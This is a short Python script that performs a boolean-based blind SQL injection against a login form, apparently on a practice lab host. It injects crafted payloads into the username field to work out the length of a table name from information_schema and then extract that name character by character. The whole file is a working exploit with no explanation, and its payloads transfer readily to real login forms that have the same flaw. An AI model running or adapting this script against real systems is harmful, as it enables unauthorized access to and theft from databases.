import requests

url = 'http://vuln.labs/labs/sql/login.php'

alpha = "abcdefghijklmnopqrstuvwxyz"
username = []
length = 0

place = 3

# get length
for i in range(1, 20):
	link = url
	payload = "f' or length((select table_name from information_schema.tables where table_schema=database() limit "+str(place)+",1))="+str(i)+" limit 1,1#"
	params = {"pwd":"f",'uname':payload}
	req = requests.post(link, data=params)
	print(payload)
	if "Username/Password" not in req.text:
		length = i
		break

# extract info from database
for i in range(1, length+1):
	for f in alpha:
		link = url
		payload = "f' or ascii(substring((select table_name from information_schema.tables where table_schema=database() limit "+str(place)+",1),"+str(i)+",1))="+str(ord(f))+" limit 1,1#"
		params = {"pwd":"f",'uname':payload}
		req = requests.post(link, data=params)
		
		if "Username/Password" not in req.text:
			print("Char: " + f)
			username.append(f)

